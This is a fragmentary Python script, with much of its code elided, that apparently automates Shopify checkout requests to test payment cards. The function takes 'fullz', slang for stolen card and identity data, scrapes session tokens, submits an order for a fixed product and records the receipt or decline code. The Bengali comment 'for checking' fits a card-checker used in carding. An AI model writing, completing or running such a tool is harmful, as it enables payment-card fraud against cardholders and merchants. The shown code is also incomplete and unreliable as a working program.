...
async def create_shopify_charge(fullz, session):
    try:
        ...
        await asyncio.sleep(0.5)
        if (
            x_checkout_one_session_token == None or
            queue_token == None or
            stable_id == None or
        ...
        # print("x_checkout_one_session_token:", x_checkout_one_session_token)
        # print("queue_token:", queue_token)
        # print("stable_id:", stable_id)
        # print("paymentMethodIdentifier:", paymentMethodIdentifier)
...
# check er jonno
        ...
        headers = {
            ...
            'x-checkout-web-build-id': '63f46b3471c6af740c92101e4586796ba56cf652',
                        ...
                        'merchandiseLines': [
                            {
                                ...
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': 'gid://shopify/ProductVariantMerchandise/40986521108660',
                                        'variantId': 'gid://shopify/ProductVariant/40986521108660',
                                        'properties': [],
                                        'sellingPlanId': None,
        ...
        try:
            receipt_id = response.json(
            )['data']['submitForCompletion']['receipt']['id']
        except:
            decline_code = await find_between(response.text, '"localizedMessageHtml":null,"message":{"code":"', '"')
        ...
        headers = {
            ...
            'user-agent': user_agent,
            'x-checkout-one-session-token': x_checkout_one_session_token,
            'x-checkout-web-build-id': '2d79b2ad0fa8687c4324c9471328473035ff26ba',
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-source-id': token,
        }
